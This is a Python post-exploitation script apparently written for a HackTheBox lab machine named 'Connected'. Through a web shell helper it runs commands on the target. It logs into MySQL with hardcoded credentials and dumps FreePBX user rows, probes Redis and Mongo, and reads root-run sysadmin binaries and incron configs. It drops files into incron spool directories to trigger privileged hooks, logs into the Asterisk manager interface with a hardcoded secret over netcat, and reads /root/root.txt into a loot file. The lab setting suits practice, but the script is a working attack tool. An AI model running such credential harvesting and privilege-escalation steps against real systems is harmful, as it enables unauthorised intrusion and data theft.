#!/usr/bin/env python3
"""Test DB access + fastest privesc (incron/sysadmin)."""
import pathlib
import sys
import time

sys.path.insert(0, "/home/kali/Desktop/htb/Connected/scripts")
from enum_privesc import get_shell  # noqa: E402

LOOT = pathlib.Path("/home/kali/Desktop/htb/Connected/loot/fast-privesc-test.txt")


def main():
    cmd, url = get_shell()
    lines = [f"shell: {url}\n"]
    tests = [
        ("mysql login", "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h 127.0.0.1 asterisk -e \"SELECT USER(), DATABASE(); SHOW GRANTS;\" 2>&1"),
        ("mysql tables", "mysql -u freepbxuser -p'mZzDpAGKTmPJ' -h 127.0.0.1 asterisk -e \"SHOW TABLES LIKE '%user%'; SELECT username,sections FROM ampusers LIMIT 5;\" 2>&1"),
        ("redis", "redis-cli -h 127.0.0.1 ping 2>&1; redis-cli -h 127.0.0.1 INFO server 2>&1 | head -8"),
        ("mongo", "mongo --quiet --eval 'db.version()' 2>&1; mongo --quiet --eval 'db.getMongo().getDBNames()' 2>&1 | head -5"),
        ("sysadmin_manager head", "head -80 /usr/bin/sysadmin_manager 2>&1"),
        ("sysadmin_portmgmt", "cat /usr/sbin/sysadmin_portmgmt 2>&1"),
        ("incron.d sysadmin", "cat /etc/incron.d/sysadmin /etc/incron.d/local /etc/incron.d/legacy 2>&1"),
    ]
    for title, c in tests:
        print(f"[*] {title}")
        o = cmd(c, timeout=120)
        lines.append(f"=== {title} ===\n{o}\n")
        print(o[:2000], "\n")

    # incron test: write hook file for sysadmin_manager (spool/incron)
    hook_name = "privesc_test_hook"
    hook_body = "test"
    print("[*] incron trigger test (sysadmin_manager)")
    o = cmd(
        f"echo '{hook_body}' > /var/spool/asterisk/incron/{hook_name} 2>&1; "
        f"sleep 2; "
        f"tail -30 /var/log/sysadmin.log 2>/dev/null; "
        f"tail -20 /var/log/messages 2>/dev/null | grep -i sysadmin; "
        f"ls -la /var/spool/asterisk/incron/",
        timeout=90,
    )
    lines.append(f"=== incron write {hook_name} ===\n{o}\n")
    print(o[:2000])

    # portmgmt_setup trigger
    print("[*] portmgmt_setup trigger")
    o = cmd(
        "date > /var/spool/asterisk/sysadmin/portmgmt_setup 2>&1; sleep 2; "
        "tail -15 /var/log/sysadmin.log 2>/dev/null; id",
        timeout=90,
    )
    lines.append(f"=== portmgmt_setup ===\n{o}\n")
    print(o[:2000])

    # AMI quick test
    print("[*] AMI cxpanel Action Status")
    o = cmd(
        "printf 'Action: Login\\r\\nUsername: cxpanel\\r\\nSecret: cxmanager*con\\r\\n\\r\\n"
        "Action: Command\\r\\nCommand: core show version\\r\\n\\r\\n' | timeout 3 nc 127.0.0.1 5038 2>&1 | head -25",
        timeout=60,
    )
    lines.append(f"=== AMI ===\n{o}\n")
    print(o[:2000])

    # root check
    o = cmd("cat /root/root.txt 2>&1; ls -la /root 2>&1 | head -5", timeout=30)
    lines.append(f"=== root.txt ===\n{o}\n")
    print("root:", o[:200])

    LOOT.write_text("\n".join(lines))
    print(f"\n[+] {LOOT}")


if __name__ == "__main__":
    main()